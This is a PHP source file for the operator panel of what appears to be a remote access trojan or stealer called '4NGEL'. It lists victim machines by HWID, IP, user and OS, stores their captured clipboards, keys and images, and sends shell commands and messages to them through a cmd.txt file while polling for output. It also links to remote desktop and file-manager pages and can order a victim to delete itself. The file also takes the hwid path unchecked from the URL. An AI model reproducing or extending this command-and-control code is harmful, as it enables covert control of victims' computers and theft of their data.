<?php
	@ini_set("display_errors", 0);
	session_start();
	if(!isset($_SESSION['id'])){
		header("Location: /");
		die();
	}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" type="text/css" href="/css/style.css">
	<link href="https://fonts.googleapis.com/css2?family=Bitter&family=PT+Sans+Narrow&display=swap" rel="stylesheet">
	<link rel="shortcut icon" href="assets/4ngel.jpg">
	<title>4NGEL</title>
</head>
<body>
	<nav>
		<a class="logo" href="/">4NGEL</a>
		<ul class="nav-list">
			<li><a href="/user/profile.php">Options</a></li>
			<li><a href="about.php">About</a></li>
			<li><a href="logout.php">Exit</a></li>
		<ul>
	</nav>
	<center>
		<hr width="75%" noshade>
	</center><br>
	<?php
	$hwid = $_GET['hwid'];
	$default_path = "logs".DIRECTORY_SEPARATOR.$hwid.DIRECTORY_SEPARATOR;

	$dir_clipboards = $default_path."clipboards".DIRECTORY_SEPARATOR;
	$dir_control = $default_path."control".DIRECTORY_SEPARATOR;
	$dir_errors = $default_path."errors".DIRECTORY_SEPARATOR;
	$dir_image = $default_path."images".DIRECTORY_SEPARATOR;
	$dir_keys = $default_path."keys".DIRECTORY_SEPARATOR;

	$file_infos = $dir_control."infos.txt";

	if(file_exists($file_infos)){
		$infos = file_get_contents($file_infos);
		$infos = explode("|", $infos);
	} else {
		header("Location: /");
		die();
	}

	$file_status = $dir_control."status.txt";
	if(file_exists($file_status)){

		if(filemtime($file_status) < strtotime("-5 sec"))
			file_put_contents($file_status, "Offline");

		elseif(filemtime($file_status) < strtotime("-7 days"))
			file_put_contents($file_status, "Died");

		$status = file_get_contents($file_status);
	} else {
		$status = "Unknow";
	}

	if($_SERVER['SCRIPT_NAME'] == "/options.php"){
	echo "
		<div class='userInfo'>
			<ul>
				<li><span>User: </span>$infos[2]</li>
				<li><span>IP: </span>$infos[1]</li>
				<li><span>HWID: </span>$infos[0]</li>
				<li><span>OS: </span>$infos[4]</li>
				<li><span>Machine Name: </span>$infos[3]</li>
				<li><span>Status: </span>$status</li>
				<li><span>Last Request At: </span>$infos[5]</li>
			</ul>
		</div>
	";
	?>
	<br><br>
	<table>
	<nav>
		<ul class="cmd_options">
			<li>
				<a class="options_cmd">CMD</a>
				<ul>
					<li><a href="options.php?hwid=<?php echo $infos[0];?>&type=message"><span style="color: grey; font-weight: bold;">|</span> Message</a></li>
					<li><a href="options.php?hwid=<?php echo $infos[0];?>&type=command"><span style="color: grey; font-weight: bold;">|</span> Command</a></li>
				</ul>
			</li>
			<li><button onclick="copyValue();"><a class="other_options">COPY</a></button></li>
			<li><a class="other_options" href="flm.php?type=flm&hwid=<?php echo $infos[0];?>">FLM</a></li>
			<li><a class="other_options" href="rdp.php?hwid=<?php echo $infos[0];?>" target="_blank">RDP</a></li>
			<li><a class="other_options" href="options.php?type=del&hwid=<?php echo $infos[0]; ?>">DEL</a></li>
		</ul>
	</nav>
	<?php
	if(isset($_GET['type'])){
		$type = $_GET['type'];

		if($type == "del"){
	?>
		<div align="center" class="upload_form">
			Are you sure want to delete ?<br><br>
			<form method="POST">
				<input type="submit" value="Yes" name="yes" class="link_up">
				<input type="submit" value="No" name="no" class="link_up">
			</form>
		</div>
	<?php
			if(isset($_POST['yes'])){
				file_put_contents($dir_control."cmd.txt", "del");
				function remove_recursive($dir){
					if(is_dir($dir)){
						$sub_files = array_diff(scandir($dir), ['.','..']);
						foreach ($sub_files as $files_to_del){
							$x = $dir.DIRECTORY_SEPARATOR.$files_to_del;
							if(is_dir($x))
								remove_recursive($x);
							else
								unlink($x);
						}
					}
					rmdir($dir);
				}
				sleep(10);
				remove_recursive($default_path);
				header("Location: /");
				die();
			} elseif(isset($_POST['no'])) {
				header("Location: options.php?hwid=$hwid");
				die();
			}
		}

		function showField($place){
			return "
			<br>
			<div align='center'>
				<form method='POST'>
					<input type='text' name='cmd' placeholder='$place' autofocus>
					<input type='submit' value='Run!'>
				</form>
			</div>";
		}

		function showCmd($type){
			if(isset($_POST['cmd'])){
				$cmd = $_POST['cmd'];
				
				$cmd_file = "logs".DIRECTORY_SEPARATOR.$_GET['hwid'].DIRECTORY_SEPARATOR
."control".DIRECTORY_SEPARATOR."cmd.txt";

				$fh = fopen($cmd_file, "w");

				fwrite($fh, $type."|".$cmd);
				fclose($fh);
				header("Refresh: 0");
				die();
			}
		}

		if($type == "command"){
			echo showField("whoami");
			showCmd("cmd");
			$output_result = $dir_control."output.txt";

			if(!file_exists($output_result))
				touch($output_result);

			echo "
			<div align='center'><br>
			<pre><br><textarea placeholder='output...' rows='5' cols='33' disabled id='output_field'>".file_get_contents($output_result)."</textarea></pre></div>";

			if(file_exists($output_result))
				file_put_contents($output_result, "");
			else
				touch($output_result);

		} elseif ($type == "message"){
			echo showField("hello...");
			showCmd("msg");
		}
	}
}
	?>
</body>
</html>

<script type='text/javascript'>
	function loadOutput(locateToAlter){
		var XMH = new XMLHttpRequest();
		XMH.onreadystatechange = function(){
			if(this.readyState == 4 && this.status == 200){
				document.getElementById("output_field").innerText = this.responseText;
			}
		};
		XMH.open("GET", locateToAlter, true);
		XMH.send();
	}

	function start(){
		time = setInterval(() => {
			loadOutput("<?php
				if(DIRECTORY_SEPARATOR == "\\")
					$dir_sep = DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR;
				elseif(DIRECTORY_SEPARATOR == "/")
					$dir_sep = DIRECTORY_SEPARATOR;

				echo "logs".$dir_sep.$hwid.$dir_sep."control".$dir_sep."output.txt"; ?>");
		}, 3000);
	}

	start();

	function copyValue(){

		let valueToCopy = "User: <?= $infos[2] ?>\nIP: <?= $infos[1] ?>\nHWID: <?= $infos[0] ?>\nOS: <?= $infos[4] ?>\nMachine Name: <?= $infos[3] ?>\nStatus: <?= $status ?>";

		navigator.clipboard.writeText(valueToCopy);
	}
</script>